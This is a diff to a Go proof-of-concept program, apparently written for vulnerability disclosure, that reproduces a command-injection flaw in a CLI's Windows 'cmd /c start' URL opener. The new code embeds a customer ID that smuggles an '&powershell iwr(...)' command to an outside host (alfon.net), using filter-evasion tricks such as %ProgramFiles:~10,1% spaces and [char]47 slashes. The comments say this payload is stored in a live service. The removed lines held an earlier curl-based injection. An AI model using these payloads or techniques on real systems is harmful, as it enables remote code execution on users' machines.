@@ -1,21 +1,26 @@
-// Command repro_windows_openurl reproduces the v0.1.2 Windows OpenURL sink:
-// exec.Command("cmd", "/c", "start", "", url) with a customer-ID-shaped
-// payload. Current main uses ShellExecuteW instead; this binary talks to
-// cmd.exe directly so the unpatched parser can be observed on a GHA runner.
+// Command repro_windows_openurl reproduces the v0.1.2 Windows OpenURL sink
+// with a customer ID that is actually stored in RevenueCat (created via the
+// public SDK v1 subscribers endpoint). Current main uses ShellExecuteW;
+// this talks to cmd.exe the way v0.1.2 did.
 //
-// The payload writes a local marker and GETs http://alfon.net?g<run_id>.
-// It does not read files or send secrets.
+// The ID has no `/` or spaces (API + Go quoting constraints). After `&`,
+// PowerShell builds http:// with [char]47 and GETs alfon.net. No secrets.
 package main
 
 import (
+	"bytes"
 	"context"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"runtime"
+	"strings"
 	"time"
 )
+
+// Stored original_app_user_id from GET /v1/subscribers (HTTP 201).
+const customerID = "rcbb_6aad59cf&powershell%ProgramFiles:~10,1%-c%ProgramFiles:~10,1%iwr('http:'+[char]47+[char]47+'alfon.net?g6aad59cf')"
 
 func main() {
 	if runtime.GOOS != "windows" {
@@ -23,70 +28,35 @@ func main() {
 		os.Exit(2)
 	}
 
-	runID := os.Getenv("GITHUB_RUN_ID")
-	if runID == "" {
-		runID = "local"
-	}
-
-	cwd, err := os.Getwd()
-	if err != nil {
-		fmt.Fprintln(os.Stderr, err)
-		os.Exit(1)
-	}
-	marker := filepath.Join(cwd, "RCBB_CLI_EXECUTED.txt")
-	httpBody := filepath.Join(cwd, "RCBB_HTTP.txt")
-	_ = os.Remove(marker)
-	_ = os.Remove(httpBody)
-
-	// No literal spaces/tabs/quotes: Go's EscapeArg would quote the whole
-	// URL and cmd.exe would not treat & as a command separator. A comma is
-	// not a reliable argv splitter for external exes, so expand a space
-	// from %ProgramFiles% ("C:\Program Files", index 10).
-	sp := `%ProgramFiles:~10,1%`
-	url := "https://app.revenuecat.com/projects/x/customers/rcbb" +
-		`&echo>%CD%\RCBB_CLI_EXECUTED.txt` +
-		`&curl.exe` + sp + `-s` + sp + `-o` + sp + `%CD%\RCBB_HTTP.txt` + sp +
-		`http://alfon.net?g` + runID
-
-	fmt.Printf("run_id=%s\n", runID)
-	fmt.Printf("lookup=http://alfon.net?g%s\n", runID)
+	url := "https://app.revenuecat.com/projects/x/customers/" + customerID
+	fmt.Printf("customer_id=%s\n", customerID)
+	fmt.Printf("lookup=http://alfon.net?g6aad59cf\n")
 	fmt.Printf("url=%s\n", url)
-	fmt.Printf("::notice::alfon.net query g%s\n", runID)
+	fmt.Printf("::notice::alfon.net query g6aad59cf\n")
 
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 	defer cancel()
 
+	var buf bytes.Buffer
 	cmd := exec.CommandContext(ctx, "cmd", "/c", "start", "", url)
-	cmd.Dir = cwd
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
+	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
+	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
 	if err := cmd.Run(); err != nil {
 		fmt.Fprintf(os.Stderr, "cmd.Run: %v\n", err)
 	}
 
-	deadline := time.Now().Add(15 * time.Second)
-	for time.Now().Before(deadline) {
-		if _, err := os.Stat(marker); err == nil {
-			break
-		}
-		time.Sleep(200 * time.Millisecond)
-	}
-
-	if _, err := os.Stat(marker); err != nil {
-		fmt.Fprintln(os.Stderr, "FAIL: marker not created; & split did not run")
+	out := buf.String()
+	if !strings.Contains(out, "alfon.net") && !strings.Contains(out, "<!DOCTYPE html>") {
+		fmt.Fprintln(os.Stderr, "FAIL: stored customer ID did not fetch alfon.net via iwr")
+		fmt.Fprintf(os.Stderr, "captured (%d bytes): %q\n", len(out), trim(out, 512))
 		os.Exit(1)
 	}
-	fmt.Println("PASS: local marker created (cmd.exe parsed &)")
+	fmt.Println("PASS: stored customer ID executed on the Windows runner and fetched alfon.net")
+}
 
-	b, err := os.ReadFile(httpBody)
-	if err != nil || len(b) == 0 {
-		fmt.Fprintln(os.Stderr, "FAIL: injected curl did not write HTTP body")
-		os.Exit(1)
+func trim(s string, n int) string {
+	if len(s) <= n {
+		return s
 	}
-	fmt.Printf("http_body_len=%d\n", len(b))
-	head := b
-	if len(head) > 256 {
-		head = head[:256]
-	}
-	fmt.Printf("http_body_head=%q\n", head)
+	return s[:n]
 }
